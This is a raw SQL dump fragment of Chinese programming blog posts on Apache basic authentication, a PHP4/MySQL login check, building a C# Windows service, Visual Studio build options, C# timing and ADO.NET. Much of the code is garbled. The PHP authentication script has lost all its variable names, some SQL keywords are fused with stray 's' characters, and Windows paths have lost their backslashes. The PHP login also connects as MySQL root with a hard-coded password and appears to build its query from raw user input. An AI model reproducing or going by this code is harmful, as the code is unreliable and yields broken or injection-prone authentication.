/>\r\norder allow,deny<br />\r\nallow from all<br />\r\n＜/Directory＞<br />\r\n其中，allowoverride authconfig一行表示允许对/usr/local/apache/htdocs/ members目录下的文件进行用户认证。<br />\r\n2.在限制访问的目录/usr/local/apache/htdocs/members下建立一个文件.htaccess，其内容如下：<br />\r\nAuthName &quot;会员区&quot;<br />\r\nAuthType basic<br />\r\nAuthUserFile/usr/local/apache/members.txt<br />\r\nrequire valid-user<br />\r\n说明：文件.htaccess中常用的配置命令有以下几个：<br />\r\n1) AuthName命令：指定认证区域名称。区域名称是在提示要求认证的对话框中显示给用户的(见附图)。<br />\r\n2)AuthType命令：指定认证类型。在HTTP1.0中，只有一种认证类型：basic。在HTTP1.1中有几种认证类型，如：MD5。<br />\r\n3) AuthUserFile命令：指定一个包含用户名和密码的文本文件，每行一对。<br />\r\n4) AuthGroupFile命令：指定包含用户组清单和这些组的成员清单的文本文件。组的成员之间用空格分开，如：<br />\r\nmanagers:user1 user2<br />\r\n5) require命令：指定哪些用户或组才能被授权访问。如：<br />\r\nrequire user user1 user2(只有用户user1和user2可以访问)<br />\r\nrequiresgroupsmanagers (只有组managers中成员可以访问)<br />\r\nrequire valid-user (在AuthUserFile指定的文件中任何用户都可以访问)<br />\r\n3.利用Apache附带的程序htpasswd，生成包含用户名和密码的文本文件：/usr/local/apache/members.txt，每行内容格式为&ldquo;用户名:密码&rdquo;。<br />\r\n#cd /usr/local/apache/bin<br />\r\n#htpasswd -bc ../members.txt user1 1234<br />\r\n#htpasswd -b ../members.txt user2 5678<br />\r\n文本文件members.txt含有两个用户：user1,口令为1234；user2，口令为5678。注意，不要将此文本文件存放在Web文档的目录树中，以免被用户下载。<br />\r\n欲了解htpasswd程序的帮助，请执行htpasswd -h。<br />\r\n当用户数量比较少时，这种方法对用户的认证是方便、省事的，维护工作也简单。但是在用户数量有数万人，甚至数十万人时，会在查找用户上花掉一定时间，从而降低服务器的效率。这种情形，应采用数据库方式。<br />\r\n采用数据库存储<br />\r\n目前，Apache、PHP4、MySQL三者是Linux下构建Web网站的最佳搭档，这三个软件都是免费软件。将三者结合起来，通过HTTP协议，利用PHP4和MySQL，实现Apache的用户认证功能。<br />\r\n只有在PHP4以Apache的模块方式来运行的时候才能进行用户认证。为此，在编译Apache时需要加入PHP4模块一起编译。假设PHP4作为Apache的模块，编译、安装Apache到/usr/local/apache目录，编译、安装MySQL到/usr/local/mysql目录。然后进行下面的步骤：<br />\r\n1.在MySQL中建立一个数据库member，在其中建立一个表users，用来存放合法用户的用户名和密码。<br />\r\n1)用vi命令在/tmp目录建立一个SQL脚本文件auth.sql，内容为：<br />\r\ndrop database if exists member;<br />\r\ncreate database member;<br />\r\nuse member;<br />\r\ncreate table users (<br />\r\nusername char(20) not null,<br />\r\npassword char(20) not null,<br />\r\n);<br />\r\ninsertsintosusers values(&quot;user1&quot;,password(&quot;1234&quot;));<br />\r\ninsertsintosusers values(&quot;user2&quot;,password(&quot;5678&quot;));<br />\r\n2)启动MySQL客户程序mysql，执行上述SQL脚本文件auth.sql的命令，在表users中增加两个用户的记录。<br />\r\n#mysql -u root -pmypwd＜/tmp/auth.sql<br />\r\n2.编写一个PHP脚本头文件auth.inc，程序内容为：<br />\r\n＜?php<br />\r\nfunction authenticate() {<br />\r\nHeader(&#39;WWW-authenticate: basic realm=&quot;会员区&quot;&#39;);<br />\r\nHeader(&#39;HTTP/1.0 401 Unauthorized&#39;);<br />\r\necho &quot;你必须输入正确的用户名和口令。 &quot;;<br />\r\nexit;<br />\r\n}<br />\r\nfunction CheckUser(, ) {<br />\r\nif ( == &quot;&quot; || == &quot;&quot;) return 0;<br />\r\n= &quot;SELECT username,password FROM usersswheresusername=&#39;&#39; and password=password(&#39;&#39;)&quot;;<br />\r\n= mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;mypwd&#39;);<br />\r\nmysql_select_db(&#39;member&#39;,);<br />\r\n= mysql_query(, );<br />\r\n=mysql_num_rows();<br />\r\nmysql_close();<br />\r\nif (＞0) {<br />\r\nreturn 1; //有效登录<br />\r\n} else {<br />\r\nreturn 0; //无效登录<br />\r\n}<br />\r\n}<br />\r\n?＞<br />\r\n函数Authenticate()的作用是利用函数Header(&#39;WWW-authenticate: basic realm=&quot;会员区&quot;&#39;)，向浏览器发送一个认证请求消息，使浏览器弹出一个用户名/密码的对话框。当用户输入用户名和密码后，包含此PHP脚本的URL将自动地被再次调用，将用户名、密码、认证类型分别存放到PHP4的三个特殊变量：、、，在PHP程序中可根据这三个变量值来判断是否合法用户。Header()函数中，basic表示基本认证类型，realm的值表示认证区域名称。<br />\r\n函数Header(&#39;HTTP/1.0 401 Unauthorized&#39;)使浏览器用户在连续多次输入错误的用户名或密码时接收到HTTP 401错误。<br />\r\n函数CheckUser()用来判断浏览器用户发送来的用户名、密码是否与MySQL数据库的相同，若相同则返回1，否则返回0。其中mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;mypwd&#39;)的数据库用户名root和密码mypwd，应根据自己的MySQL设置而改变。<br />\r\n3.在需要限制访问的每个PHP脚本程序开头增加下列程序段:<br />\r\n＜?php<br />\r\nrequire(&#39;auth.inc&#39;);<br />\r\nif (CheckUser(,)==0) {<br />\r\nauthenticate();<br />\r\n} else {<br />\r\necho &quot;这是合法用户要访问的网页。&quot;; //将此行改为向合法用户输出的网页<br />\r\n}<br />\r\n?＞<br />\r\n把需要向合法用户显示的网页内容放到else子句中，取代上述程序段的一行：<br />\r\necho &quot;这是合法用户要访问的网页。&quot;;<br />\r\n这样，当用户访问该PHP脚本程序时，需要输入用户名和密码来确认用户的身份。<br />\r\nWindows的Apache用户认证<br />\r\n1.采用文本文件存放用户名和密码时，其方法同前，但需要注意的是表示路径的目录名之间、目录名与文件名之间一律用斜线&ldquo;/&rdquo;分开，而不是反斜线&ldquo;&rdquo;。<br />\r\n2.采用MySQL数据库存放用户名和密码时，首先按下列方法将PHP 4.0.3作为Apache的模块来运行，然后按上述&ldquo;采用数据库存储用户名和密码的用户认证&rdquo;的方法完成。<br />\r\n1)下载Windows版的Apache 1.3.12、PHP 4.0.3、MySQL 3.2.32，将三个软件分别解压、安装到C:pache、C:PHP4、C:mysql目录。<br />\r\n2) C:PHP4SAPI目录有几个常用Web服务器的PHP模块文件，将其中php4apache.dll拷贝到Apache的modules子目录(C:pachemodules)。<br />\r\n3)修改Apache的配置文件C:pachenfhttpd.conf，增加以下几行：<br />\r\nLoadModule php4_module modules/ php4apache.dll<br />\r\nAddType application/x-httpd-php .php3<br />\r\nAddType application/x-httpd-php-source .phps<br />\r\nAddType application/x-httpd-php .php<br />\r\n第一行使PHP4以Apache的模块方式运行，这样才能进行用户认证，后三行定义PHP脚本程序的扩展名。<br />\r\n4)在autoexec.bat文件的PATH命令中增加PHP4所在路径&ldquo;C:PHP4&rdquo;，重新启动电脑。</p>\r\n\r\n<p>&nbsp;<br />\r\n在apache的conf文件中添加如下 &lt;Directory &quot;d:/veriwire/submit&quot;&gt; Authname &quot;www1&quot; #提示框上显示的 AuthType Basic #类型 AuthUserFile d:/userpwd #PASS文件位置 Require user www1 #用户名 &lt;/Directory&gt; 然后到apache的bin目录下执行如下： htpasswd -c d:/userpwd www1（我保存在D盘下了） 然后访问站点上的这个目录就会提示输入PASSWORD和USERNAME。</p>\r\n',0,1438328998,0,0),(147,38,'用C#创建Windows服务(Windows Services)','<p>用C#创建Windows服务(Windows Services)</p>\r\n\r\n<p>Windows服务在Visual Studio 以前的版本中叫NT服务，在VS.net启用了新的名称。用Visual C# 创建Windows服务不是一件困难的事，本文就将指导你一步一步创建一个Windows服务并使用它。这个服务在启动和停止时，向一个文本文件中写入一些文字信息。</p>\r\n\r\n<p>第一步：创建服务框架</p>\r\n\r\n<p>要创建一个新的 Windows 服务，可以从Visual C# 工程中选取 Windows 服务（Windows Service）选项，给工程一个新文件名，然后点击 确定。</p>\r\n\r\n<p>你可以看到，向导向工程文件中增加WebService1.cs类：</p>\r\n\r\n<p>其中各属性的含意是:</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Autolog&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 是否自动写入系统的日志文件</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CanHandlePowerEvent&nbsp;&nbsp;&nbsp;&nbsp; 服务时候接受电源事件</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CanPauseAndContinue&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 服务是否接受暂停或继续运行的请求</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CanShutdown 服务是否在运行它的计算机关闭时收到通知，以便能够调用 OnShutDown 过程</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CanStop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 服务是否接受停止运行的请求</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ServiceName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 服务名</p>\r\n\r\n<p>第二步：向服务中增加功能</p>\r\n\r\n<p>在 .cs代码文件中我们可以看到，有两个被忽略的函数 OnStart和OnStop。</p>\r\n\r\n<p>OnStart函数在启动服务时执行，OnStop函数在停止服务时执行。在这里，当启动和停止服务时，向一个文本文件中写入一些文字信息，代码如下:</p>\r\n\r\n<p>protected override void OnStart(string[] args)</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;FileStream fs = new FileStream(@&quot;d:\\mcWindowsService.txt&quot; , FileMode.OpenOrCreate, FileAccess.Write);</p>\r\n\r\n<p>StreamWriter m_streamWriter = new StreamWriter(fs);</p>\r\n\r\n<p>m_streamWriter.BaseStream.Seek(0, SeekOrigin.End);</p>\r\n\r\n<p>m_streamWriter.WriteLine(&quot;mcWindowsService:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Service Started&quot;+DateTime.Now.ToString()+&quot;\\n&quot;);</p>\r\n\r\n<p>m_streamWriter.Flush();</p>\r\n\r\n<p>m_streamWriter.Close();</p>\r\n\r\n<p>fs.Close();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>protected override void OnStop()</p>\r\n\r\n<p>{</p>\r\n\r\n<p>FileStream fs = new FileStream(@&quot;d:\\mcWindowsService.txt&quot; , FileMode.OpenOrCreate, FileAccess.Write);</p>\r\n\r\n<p>StreamWriter m_streamWriter = new StreamWriter(fs);</p>\r\n\r\n<p>m_streamWriter.BaseStream.Seek(0, SeekOrigin.End);</p>\r\n\r\n<p>m_streamWriter.WriteLine(&quot; mcWindowsService: Service Stopped &quot;+DateTime.Now.ToString()+&quot;\\n&quot;);</p>\r\n\r\n<p>m_streamWriter.Flush();</p>\r\n\r\n<p>m_streamWriter.Close();</p>\r\n\r\n<p>fs.Close();</p>\r\n\r\n<p>}</p>\r\n\r\n<p>第三步: 将安装程序添加到服务应用程序</p>\r\n\r\n<p>Visual Studio.NET 随附有安装组件，可用来安装与服务应用程序相关联的资源。安装组件在正在安装到的系统上注册一项单个的服务，并使服务控制管理器知道该服务的存在。</p>\r\n\r\n<p>要正确安装服务，并不需要在安装程序中进行任何特殊编码。但是，如果需要向安装进程添加特殊功能，则可能偶尔需要修改安装程序的内容。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 将安装程序添加到服务应用程序的步骤是:</p>\r\n\r\n<p>1：在解决方案中，访问要向其中添加安装组件的服务的Design视图。</p>\r\n\r\n<p>2：在属性窗口中，单击添加安装程序链接</p>\r\n\r\n<p>这时项目中就添加了一个新类 ProjectInstaller 和两个安装组件 ServiceProcessInstaller 和 ServiceInstaller，并且服务的属性值被复制到组件。</p>\r\n\r\n<p>3：若要确定如何启动服务，请单击 ServiceInstaller 组件并将 StartType 属性设置为适当的值。</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Manual&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 服务安装后，必须手动启动。</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Automatic&nbsp;&nbsp;&nbsp; 每次计算机重新启动时，服务都会自动启动。</p>\r\n\r\n<p>&uuml;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disabled&nbsp;&nbsp;&nbsp;&nbsp; 服务无法启动。</p>\r\n\r\n<p>4：将serviceProcessInstaller类的Account属性改为 LocalSystem</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; 这样，不论是以哪个用户登录的系统，服务总会启动。</p>\r\n\r\n<p>第四步：生成服务程序</p>\r\n\r\n<p>通过从生成菜单中选择生成来生成项目。</p>\r\n\r\n<p>注意&nbsp;&nbsp; 不要通过按 F5 键来运行项目&mdash;&mdash;不能以这种方式运行服务项目。</p>\r\n\r\n<p>第五步：安装服务</p>\r\n\r\n<p>访问项目中的已编译可执行文件所在的目录。 &nbsp;</p>\r\n\r\n<p>用项目的输出作为参数，从命令行运行 InstallUtil.exe。在命令行中输入下列代码： &nbsp;</p>\r\n\r\n<p>installutil yourproject.exe</p>\r\n\r\n<p>卸载服务</p>\r\n\r\n<p>用项目的输出作为参数，从命令行运行 InstallUtil.exe。</p>\r\n\r\n<p>installutil /u yourproject.exe</p>\r\n\r\n<p>至此，整个服务已经编写，编译，安装完成，你可以在控制面板的管理工具的服务中，看到你编写的服务。</p>\r\n',0,1438329330,0,0),(148,38,'VS2010 生成菜单下面：生成/重新生成/清理解决方案有什么区别','<p>VS2010 生成菜单下面：生成/重新生成/清理解决方案有什么区别？还有下面的生成 /重新生成/清理 abc 又是什么区别我注意到图标中，一个是三个向下的箭头，一个是两个向下箭头。没明白，求高人指点一下。</p>\r\n\r\n<p>vs ide一个解决方案是可以加入多个项目的，如果当前解决方案只有一个项目，执行项目&ldquo;生成/重新生成/清理&rdquo;和解决方案&ldquo;生成/重新生成/清理&rdquo;是一样的，当有多个项目时选择解决方案的&ldquo;生成/重新生成/清理&rdquo;对解决方案下的项目都有效，如果选择了&ldquo;清理&rdquo;所有的项目都会被清理，要是不想全部清理就要单独选择要清理的项目进行&ldquo;清理&rdquo;操作，&ldquo;生成/重新生成&rdquo;也是一样的，不过要注意的是选择生成解决方案并不一定是工程编译想要的顺序，有库链接时可能会报错误。生成：如果工程没有编译过就全部编译，已经编译过了只对修改过的有关内容进行编译，重新生成：就是先清理一次对所有文件进行编译。清理：把编译器编译出来的文件都清理掉包括可执行文件链接库。</p>\r\n',0,1438329432,0,0),(149,38,'C#时间(几个常用时间,程序运行计时,页面运行计时)','<p>1.DateTime<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DateTime now = System.DateTime.Now;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; now.ToString();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 2006/08/30 17:31:02<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; now.ToString(&quot;yyyy-mm-dd hh:MM:ss&quot;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 2006-08-30 05:39:11<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; now.ToString(&quot;yyyy-mm-dd HH:mm:ss&quot;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 2006-08-30 17:40:50<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.DateTime.MaxValue.ToString();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 9999/12/31 23:59:59<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.DateTime.MinValue.ToString();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 0001/01/01 0:00:00<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; now.ToLongDateString();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 2006年8月30日<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; now.ToLongTimeString();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 17:34:23<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; now.ToShortTimeString();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //显示: 17:34<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; now.ToString() + &quot; &quot; + now.Millisecond.ToString();&nbsp;&nbsp; //显示: 2006/08/30 17:35:19 484</p>\r\n\r\n<p>2.程序运行时间:(单位 :&nbsp; 毫秒)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Diagnostics ;&nbsp; //名称空间<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int x = 0;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int nu = 0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Stopwatch sw = new Stopwatch();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sw.Start();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //程序开始<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; 1000000; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x += i;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //程序结束<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sw.Stop();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.label1.Text += &quot;,sum=&quot; + x.ToString();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(sw.ElapsedMilliseconds.ToString());<br />\r\n3.计算一个页面执行时间:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 在Global.asax.cs文件中增加以下代码:<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; protected void Application_BeginRequest(Object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Application[&quot;StartTime&quot;] = System.DateTime.Now;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; protected void Application_EndRequest(Object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.DateTime startTime = (System.DateTime)Application[&quot;StartTime&quot;];<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.DateTime endTime = System.DateTime.Now;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.TimeSpan ts = endTime - startTime;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Response.Write(&quot;页面执行所用时间:&quot; + ts.Milliseconds + &quot; 毫秒&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n',0,1438329493,0,0),(150,38,'总结DataSet,SqlDataAdapter,SqlCommand,SqlDataReader','<p>因朋友强烈要求。总结DataSet,SqlDataAdapter,SqlCommand,SqlDataReader</p>\r\n\r\n<p>直接的关系。。。反正没事。就给他总结下。。。</p>\r\n\r\n<p>DataSet和SqlDataAdapter在一起用，就没SqlCommand什么事了,通常作用是把某张表的信息显示出来，比如显示在GridView上之类的</p>\r\n\r\n<p>ExecuteNonQuery和SqlCommand一起用，也就没DataSet和SqlDataAdapter什么事了,通常用在对数据的增加、修改、删除，注意查询不能用它</p>\r\n\r\n<p>要说查询SqlDataReader和SqlCommand一起使用，是用来查询的，我想你是这个意思，按照我的理解，查询少量数据的时候使用SqlDataReader比较方便和灵活，效率也高，比如查询某一行数据之类的</p>\r\n\r\n<p>另外还有个ExecuteScalar也和SqlCommand一起用作用，返回单个值，如求和、总行数等SQL语句的聚合函数，比如SELECT COUNT(*) FROM 表名1</p>\r\n\r\n<p>对比ADO.NET的数据库对象的关系图，我们可以用对比的方法来形象地理解每个对象的作用，如图5-4所示。</p>\r\n\r\n<p>l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 数据库好比水源，存储了大量的数据。</p>\r\n\r\n<p>l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Connection好比伸入水中的进水笼头，保持与水的接触，只有它与水进行了&ldquo;连接&rdquo;，其他对象才可以抽到水。</p>\r\n\r\n<p>l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Command则像抽水机，为抽水提供动力和执行方法，通过&ldquo;水龙头&rdquo;，然后把水返给上面的&ldquo;水管&rdquo;。</p>\r\n\r\n<p>l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataAdapter、DataReader就像输水管，担任着水的传输任务，并起着桥梁的作用。二者是有不同的，后面章节中将详细介绍。</p>\r\n\r\n<p>l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet则是一个大水库，把抽上来的水按一定关系的池子进行存放。即使撤掉&ldquo;抽水装置&rdquo;（断开连接，离线状态），也可以保持&ldquo;水&rdquo;的存在。这也正是ADO.NET的核心。</p>\r\n\r\n<p>l&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataTable则像水库中的每个独立的水池子，分别存放不同种类的水。一个大水库由一个或多个这样的水池子组成。</p>\r\n\r\n<p>本文来自CSDN博客，转载请标明出处：http://blog.csdn.net/franco_zhan/archive/2010/03/13/5377685.aspx</p>\r\n',0,1438329577,0,0),(151,38,'通过SqlDataAdapter 插入DataSet中的数据到数据库','<p>关于 通过SqlDataAdapter 插入DataSet中的数据到数据库 有两种方法：</p>\r\n\r\n<p>(1)</p>\r\n\r\n<p>使用SqlCommandBuilder</p>\r\n\r\n<p>&nbsp; SqlConnection conn=new SqlConnection();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn.ConnectionString=ConfigurationManager.ConnectionStrings[&quot;TestDBConnectionString&quot;].ConnectionString;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; conn.Open();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommand cmd=new SqlCommand();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.CommandText=&quot;select * from UserInfo&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.CommandType=CommandType.Text;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cmd.Connection=conn;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlDataAdapter adapter = new SqlDataAdapter();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SqlCommandBuilder build = new SqlCommandBuilder(adapter);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DataSet ds = new DataSet();<br 